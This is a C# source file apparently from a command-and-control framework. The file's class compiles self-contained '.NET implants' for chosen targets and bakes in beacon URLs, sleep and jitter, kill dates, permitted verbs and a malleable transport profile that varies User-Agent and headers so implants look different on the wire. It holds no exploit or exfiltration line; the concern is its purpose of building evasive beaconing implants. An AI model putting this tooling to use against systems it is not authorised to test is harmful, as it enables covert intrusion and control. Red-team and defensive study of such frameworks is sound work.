using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Text.Json;
using Rod.CoreState.Implants;

namespace Rod.BuildPipeline.PayloadBuild;

/// <summary>
/// The real .NET build unit. Drives the reference .NET implant's
/// toolchain to compile a self-contained, per-implant artifact through the build
/// contract (architecture.md Sec 6). It runs <c>dotnet publish</c> against the
/// implant source tree, baking the per-implant profile into a generated
/// <c>BakedProfile.g.cs</c> source file so each artifact carries its own endpoint,
/// check-in mode, beacon parameters, and kill date (architecture.md Sec 5.1).
/// No key material exists at build time at all: the implant's identity is the
/// keypair it generates at first run, bound by the CA at enroll
/// (architecture.md Sec 9), so a captured artifact leaks nothing reusable.
///
/// The teamserver is coupled to this unit only by the build contract: it sends
/// <see cref="BuildParams"/> and gets a <see cref="BuildArtifact"/> back, and the
/// .NET toolchain lives entirely on the build-unit side. The unit throws a clear
/// error when <c>dotnet</c> is missing or the build fails, so the build endpoint
/// maps that to a 5xx rather than a silent stub.
/// </summary>
public sealed class DotNetBuildUnit : IBuildUnit
{
    // The implant source tree, relative to the build-pipeline project, that this
    // unit compiles. Overridable via the constructor so tests can point at a
    // fixture or skip a real build. The default walks up from the assembly to find
    // the repo root and lands at <root>/src/implant/dotnet (the tree added with ).
    private readonly string _implantSourceDir;
    private readonly string _dotnetBinary;

    public Language Language => Language.DotNet;

    /// <summary>
    /// Builds a .NET build unit. <paramref name="implantSourceDir"/> is the implant
    /// tree to compile (the one containing the .csproj and Program.cs); defaults
    /// to <c>&lt;repo&gt;/src/implant/dotnet</c>. <paramref name="dotnetBinary"/> is the
    /// dotnet executable, defaulting to PATH resolution of <c>dotnet</c>.
    /// </summary>
    public DotNetBuildUnit(string? implantSourceDir = null, string? dotnetBinary = null)
    {
        _implantSourceDir = implantSourceDir ?? ResolveDefaultImplantSourceDir();
        _dotnetBinary = dotnetBinary ?? "dotnet";
    }

    public async Task<BuildArtifact> BuildAsync(BuildParams @params, CancellationToken cancellationToken = default)
    {
        if (!Directory.Exists(_implantSourceDir))
            throw new InvalidOperationException(
                $".NET implant source tree not found at '{_implantSourceDir}'.");

        // The artifact must run on the target, not on the build host: map the
        // requested OS/arch onto a runtime identifier and publish self-contained
        // so no .NET has to be installed on the target (the practical deployment
        // shape -- a target with a shared .NET 10 on it is a rarity, not the
        // rule). Single-file bundles the runtime; compression trades a slower
        // cold start for a much smaller artifact worth transferring.
        var rid = MapRid(@params.Target);

        var now = DateTimeOffset.UtcNow;
        var baked = RenderBakedProfile(@params);

        // A unique temp work dir per build that mirrors the implant's relative
        // layout in the repo: <work>/src/implant/dotnet references <work>/src/
        // teamserver/Rod.Protocol/protos/rod.proto via a relative path, and
        // resolves CPM and the shared build props from <work>. Copying that
        // structure keeps the build hermetic -- the real source tree is never
        // mutated and two concurrent builds never step on each other (also why
        // the Go build unit partitions GOCACHE).
        var workDir = Path.Combine(Path.GetTempPath(), "rod-dotnet-build-" + Guid.NewGuid().ToString("N"));
        var stagingDir = Path.Combine(workDir, "src", "implant", "dotnet");
        var outputDir = Path.Combine(workDir, "out");
        try
        {
            CopyTree(_implantSourceDir, stagingDir);

            // Reproduce the relative layout the csproj assumes: the proto is at
            // <work>/src/teamserver/Rod.Protocol/protos/rod.proto (referenced as
            // ../../teamserver/... from the implant dir), and CPM + shared props
            // sit at <work>/.
            CopyProtoTree(_implantSourceDir, workDir);
            CopyRepoProps(_implantSourceDir, workDir);

            // Overwrite the checked-in BakedProfile stub with the per-build profile.
            // The committed stub compiles empty so the implant runs from flags/env
            // during development; the build unit replaces it with the real profile
            // here, in the copy, leaving the source of truth untouched.
            var bakedPath = Path.Combine(stagingDir, "BakedProfile.cs");
            await File.WriteAllTextAsync(bakedPath, RenderBakedSource(baked), cancellationToken);

            // dotnet publish compiles the implant (including its proto client
            // bindings) into a self-contained single-file executable for the
            // requested runtime identifier: one native entrypoint, runtime
            // bundled, no target-side install.
            var result = await RunDotNetAsync(
                new[]
                {
                    "publish",
                    "-c", "Release",
                    "-r", rid,
                    "--self-contained", "true",
                    "-p:PublishSingleFile=true",
                    "-p:EnableCompressionInSingleFile=true",
                    "-o", outputDir,
                    "--nologo",
                    "/clp:NoSummary",
                },
                stagingDir,
                cancellationToken);

            if (result.ExitCode != 0)
            {
                // dotnet writes build errors to stdout, not stderr, so the
                // diagnostic combines both streams -- whichever carries the
                // failure cause is what the operator sees.
                var diag = result.Stdout;
                if (result.Stderr.Length > 0)
                    diag = (diag.Length > 0 ? diag + "\n" : "") + result.Stderr;
                throw new InvalidOperationException(
                    $"dotnet publish failed (exit {result.ExitCode}):\n{diag}");
            }

            // The single-file executable is the artifact: the compiled implant
            // with the runtime bundled, ready to drop on the target and run. A
            // Windows target gets an .exe; everything else gets the extensionless
            // native binary.
            var exeName = rid.StartsWith("win", StringComparison.Ordinal) ? "Rod.Implant.exe" : "Rod.Implant";
            var exePath = Path.Combine(outputDir, exeName);
            if (!File.Exists(exePath))
                throw new InvalidOperationException(
                    $"dotnet publish reported success but produced no {exeName}.");

            var content = await File.ReadAllBytesAsync(exePath, cancellationToken);
            return BuildArtifact.Of(
                Language,
                artifactId: Guid.NewGuid(),
                @params,
                content,
                contentType: "application/octet-stream",
                builtAt: now);
        }
        finally
        {
            TryCleanup(workDir);
        }
    }

    // Maps a build target onto a .NET runtime identifier. The contract speaks
    // Go-style os/arch pairs (linux/amd64); dotnet speaks RIDs (linux-x64). The
    // accepted arch aliases cover the spellings operators actually send; anything
    // else fails with the supported set named so the request is fixable.
    public static string MapRid(TargetProfile target)
    {
        var os = target.OperatingSystem.Trim().ToLowerInvariant();
        var arch = target.Architecture.Trim().ToLowerInvariant();
        var ridArch = arch switch
        {
            "amd64" or "x64" or "x86_64" => "x64",
            "x86" or "386" => "x86",
            "arm64" or "aarch64" => "arm64",
            _ => throw new InvalidOperationException(
                $"Unsupported target architecture '{target.Architecture}' for the .NET build unit " +
                "(supported: amd64/x64, x86/386, arm64/aarch64)."),
        };
        return os switch
        {
            "linux" => $"linux-{ridArch}",
            "windows" or "win" => $"win-{ridArch}",
            "osx" or "darwin" or "macos" => $"osx-{ridArch}",
            _ => throw new InvalidOperationException(
                $"Unsupported target OS '{target.OperatingSystem}' for the .NET build unit " +
                "(supported: linux, windows, osx)."),
        };
    }

    // Renders the baked profile as a compact JSON map, base64-url-encoded without
    // padding so it is safe to embed verbatim in a C# string literal. This shape
    // is the language-neutral wire contract: any build unit -- a community
    // Go/C/Nim unit out-of-tree, or this in-tree .NET unit -- must emit the same
    // keys and encoding so an implant of any language decodes the same profile.
    // The key set is exactly what the reference implant consumes (its
    // BakedProfileSupport maps each key), plus the class verb set, which the
    // planned implant-side capability derivation reads (architecture.md Sec 5.3).
    // No key material is baked at all: the implant reads its key from the
    // teamserver at enroll time, not from the baked profile (architecture.md
    // Sec 7).
    public static string RenderBakedProfile(BuildParams @params)
    {
        // The class's reduced verb set (architecture.md Sec 5.2), comma-joined so
        // the artifact is self-describing: the generated implant carries the verbs
        // it is permitted to run, baked in alongside its profile.
        var verbs = string.Join(",", ImplantClassCapabilities.For(@params.Class));
        // The malleable transport profile (architecture.md Sec 7): the enroll
        // path, User-Agent, custom headers, request timeout, and body envelope
        // that shape the wire so two implants do not look the same. Headers ride
        // as a nested JSON object (an empty profile emits {}) and the envelope is
        // the lowercase enum name. Header object keys are sorted for stable byte
        // output so the baked profile matches the wire-contract shape across build
        // units.
        var map = new Dictionary<string, object>
        {
            ["enrollURL"] = @params.Transport.Endpoint,
            ["beaconURL"] = BeaconUrlFromEnroll(@params.Transport.Endpoint),
            ["mode"] = @params.Beacon.Mode,
            ["killDate"] = @params.Beacon.KillDate.ToString("O"),
            ["sleep"] = ((long)@params.Beacon.Sleep.TotalSeconds).ToString() + "s",
            ["jitter"] = ((long)@params.Beacon.Jitter.TotalSeconds).ToString() + "s",
            ["enrollPath"] = @params.Transport.EnrollPath,
            ["userAgent"] = @params.Transport.UserAgent,
            ["headers"] = RenderHeadersMap(@params.Transport.Headers),
            ["requestTimeout"] = ((long)@params.Transport.RequestTimeout.TotalSeconds).ToString() + "s",
            ["envelope"] = @params.Transport.Envelope.ToString().ToLowerInvariant(),
            ["verbs"] = verbs,
        };
        var json = JsonSerializer.Serialize(map);
        return Base64UrlCodec.Encode(Encoding.UTF8.GetBytes(json));
    }

    // Renders the profile's custom headers as a JSON-object value (a
    // Dictionary<string,string>, {} when empty) with keys sorted so the baked
    // profile's byte output is stable across builds regardless of the runtime's
    // dictionary iteration order.
    private static Dictionary<string, string> RenderHeadersMap(IReadOnlyDictionary<string, string> headers)
    {
        var ordered = new Dictionary<string, string>(StringComparer.Ordinal);
        foreach (var key in headers.Keys.OrderBy(k => k, StringComparer.Ordinal))
            ordered[key] = headers[key];
        return ordered;
    }

    // Materializes the generated BakedProfile.cs source from a baked profile. The
    // file replaces the checked-in stub in the per-build copy of the source tree;
    // the implant's Program reads BakedProfile.Json and decodes the base64url JSON.
    private static string RenderBakedSource(string base64UrlProfile)
    {
        // The profile is embedded as a verbatim C# string literal. base64url
        // (A-Za-z0-9-_) contains no characters that need escaping in a verbatim
        // string, so the literal is exactly the encoded value.
        return "// <auto-generated> Generated by Rod.DotNetBuildUnit at build time.\n"
            + "// The per-implant profile, baked in at generation (architecture.md Sec 5.1).\n"
            + "namespace Rod.Implant;\n\n"
            + "internal static class BakedProfile\n"
            + "{\n"
            + "    public const string Json = \"" + base64UrlProfile + "\";\n"
            + "}\n";
    }

    // The beacon URL is the enroll endpoint with /implants/enroll stripped. The
    // build params carry a single endpoint; the implant accepts an explicit beacon
    // URL when enroll and beacon hosts differ (a redirector in front). Mirrors the
    // Go build unit.
    private static string BeaconUrlFromEnroll(string enrollEndpoint)
    {
        const string suffix = "/implants/enroll";
        if (enrollEndpoint.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
            return enrollEndpoint[..^suffix.Length];
        return enrollEndpoint;
    }

    // Recursively copies a directory tree, skipping bin/obj and any prior build
    // output so a stale publish never leaks into the build. The implant source
    // tree is small (a handful of .cs files plus the csproj and proto reference),
    // so a full copy is cheap and keeps the real source tree untouched.
    private static void CopyTree(string source, string destination)
    {
        Directory.CreateDirectory(destination);
        foreach (var entry in Directory.EnumerateFileSystemEntries(source))
        {
            var name = Path.GetFileName(entry);
            if (name is "bin" or "obj")
                continue;
            var target = Path.Combine(destination, name);
            if (Directory.Exists(entry))
                CopyTree(entry, target);
            else
                File.Copy(entry, target, overwrite: true);
        }
    }

    // Walks up from the implant source tree to the repo root: the directory
    // holding both src/ and tests/. Used to locate the shared MSBuild props and
    // the teamserver proto the implant builds against, regardless of how deep
    // the implant sits under src/.
    private static DirectoryInfo? FindRepoRoot(DirectoryInfo start)
    {
        DirectoryInfo? dir = start;
        while (dir is not null)
        {
            if (Directory.Exists(Path.Combine(dir.FullName, "src"))
                && Directory.Exists(Path.Combine(dir.FullName, "tests")))
                return dir;
            dir = dir.Parent;
        }
        return null;
    }

    // Copies the repo-root MSBuild props (Directory.Build.props and
    // Directory.Packages.props) and the SDK pin (global.json) into the work dir
    // so the staging copy of the implant resolves CPM, the shared build settings,
    // and the pinned SDK the same way it does in the real tree. The implant's
    // csproj walks up from its dir to find these, so they must sit one level
    // above the staging copy. If a file is absent (e.g. an older tree), it is
    // skipped rather than failing.
    private static void CopyRepoProps(string implantSourceDir, string workDir)
    {
        // The shared props sit at the repo root: the directory holding both src/
        // and tests/, found by walking up from the implant tree.
        var repoRoot = FindRepoRoot(new DirectoryInfo(implantSourceDir))?.FullName;
        if (repoRoot is null || !Directory.Exists(repoRoot))
            return;
        foreach (var name in new[] { "Directory.Build.props", "Directory.Packages.props", "global.json" })
        {
            var src = Path.Combine(repoRoot, name);
            if (File.Exists(src))
                File.Copy(src, Path.Combine(workDir, name), overwrite: true);
        }
    }

    // Copies the teamserver proto tree (src/teamserver/Rod.Protocol/protos/) into
    // the work dir under the same relative path the implant's csproj references
    // it by (../../teamserver/Rod.Protocol/protos/ from the implant dir). The
    // proto is the single source of truth for the wire contract and is
    // referenced, not copied, by the csproj -- so the build needs the same
    // relative layout to find it. rod.proto has no imports, so only it (and its
    // protos/ dir) is needed.
    private static void CopyProtoTree(string implantSourceDir, string workDir)
    {
        var repoRoot = FindRepoRoot(new DirectoryInfo(implantSourceDir))?.FullName;
        if (repoRoot is null || !Directory.Exists(repoRoot))
            return;
        var protoSrcDir = Path.Combine(repoRoot, "src", "teamserver", "Rod.Protocol", "protos");
        if (!Directory.Exists(protoSrcDir))
            return;
        var protoDstDir = Path.Combine(workDir, "src", "teamserver", "Rod.Protocol", "protos");
        Directory.CreateDirectory(protoDstDir);
        foreach (var file in Directory.EnumerateFiles(protoSrcDir))
            File.Copy(file, Path.Combine(protoDstDir, Path.GetFileName(file)), overwrite: true);
    }

    // Runs dotnet with the given arguments, from the implant source directory,
    // capturing stdout and stderr for the error message on failure (dotnet writes
    // build errors to stdout). Reads both to completion after the process exits so
    // the captured text is never truncated by an async-read race.
    private async Task<(int ExitCode, string Stdout, string Stderr)> RunDotNetAsync(
        string[] args, string workingDirectory, CancellationToken cancellationToken)
    {
        var psi = new ProcessStartInfo
        {
            FileName = _dotnetBinary,
            WorkingDirectory = workingDirectory,
            UseShellExecute = false,
            RedirectStandardError = true,
            RedirectStandardOutput = true,
        };
        foreach (var arg in args)
            psi.ArgumentList.Add(arg);
        // Isolate the NuGet package cache and the build output from the runner's
        // environment so two concurrent builds never race, and so the build is
        // reproducible regardless of the host's NUGET_PACKAGES layout.
        psi.Environment["NUGET_PACKAGES"] = Path.Combine(Path.GetTempPath(), "rod-dotnet-nuget");
        // Quiet the SDK's telemetry and first-time-experience prompts in CI/headless.
        psi.Environment["DOTNET_CLI_TELEMETRY_OPTOUT"] = "1";
        psi.Environment["DOTNET_NOLOGO"] = "1";
        psi.Environment["DOTNET_SKIP_FIRST_TIME_EXPERIENCE"] = "1";

        using var process = new Process { StartInfo = psi };
        if (!process.Start())
            throw new InvalidOperationException($"Failed to start dotnet ('{_dotnetBinary}').");

        // Read both streams fully on background tasks so a full pipe cannot block
        // the build, and so the text is complete by the time we read it after exit.
        var stdoutTask = process.StandardOutput.ReadToEndAsync(cancellationToken);
        var stderrTask = process.StandardError.ReadToEndAsync(cancellationToken);

        try
        {
            await process.WaitForExitAsync(cancellationToken);
        }
        catch (OperationCanceledException)
        {
            try { process.Kill(entireProcessTree: true); } catch { }
            throw;
        }

        var stdout = await stdoutTask;
        var stderr = await stderrTask;
        return (process.ExitCode, stdout, stderr);
    }

    // The default implant tree is <repo>/src/implant/dotnet, found by walking up
    // from this assembly to the repo root -- the directory holding src/implant/
    // dotnet alongside src/teamserver. Keeps the build unit independent of the
    // working directory it is invoked from.
    private static string ResolveDefaultImplantSourceDir()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            if (Directory.Exists(Path.Combine(dir.FullName, "src", "implant", "dotnet"))
                && Directory.Exists(Path.Combine(dir.FullName, "src", "teamserver")))
                return Path.Combine(dir.FullName, "src", "implant", "dotnet");
            dir = dir.Parent;
        }
        // Fall back to a relative path so the error message in BuildAsync is clear.
        return Path.Combine("..", "..", "..", "..", "..", "src", "implant", "dotnet");
    }

    private static void TryCleanup(string path)
    {
        try { Directory.Delete(path, recursive: true); }
        catch { /* best-effort; temp dir is disposable */ }
    }

}
